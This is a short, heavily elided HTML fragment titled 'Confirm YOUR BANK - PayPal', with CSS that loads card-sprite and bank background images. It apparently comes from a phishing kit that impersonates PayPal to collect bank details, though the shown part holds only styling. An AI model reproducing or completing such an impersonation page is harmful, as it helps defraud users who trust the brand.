...
<html>
<head>
    <title>Confirm YOUR BANK - PayPal</title>
...
<style>
    ...
    .card{
        ...
        background-image: url("css/dixon_sprites_cc_global.png");
...
<body style="background-image: url('css/dixon_bank.PNG'); background-repeat: no-repeat; background-position: center -1px;height: 780px;">
